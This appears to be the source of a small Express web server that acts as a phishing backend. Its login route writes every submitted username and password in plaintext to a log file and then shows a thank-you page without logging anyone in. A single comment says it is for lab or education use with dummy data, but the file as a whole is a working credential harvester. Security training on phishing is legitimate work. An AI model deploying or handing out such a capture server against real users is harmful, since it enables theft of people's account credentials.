const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 3000;

// Parse form data from POST requests
app.use(express.urlencoded({ extended: true }));

// Serve static files from the "public" folder
app.use(express.static(path.join(__dirname, 'public')));

// Handle login form submission
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // DUMMY DATA ONLY – for lab/education use on your own machine
  const line = `${new Date().toISOString()} - username=${username}, password=${password}\n`;

  fs.appendFile(path.join(__dirname, 'log.txt'), line, (err) => {
    if (err) {
      console.error('Error writing to log file:', err);
    }
  });

  // After "login" show a thank-you page
  res.sendFile(path.join(__dirname, 'public', 'thanks.html'));
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});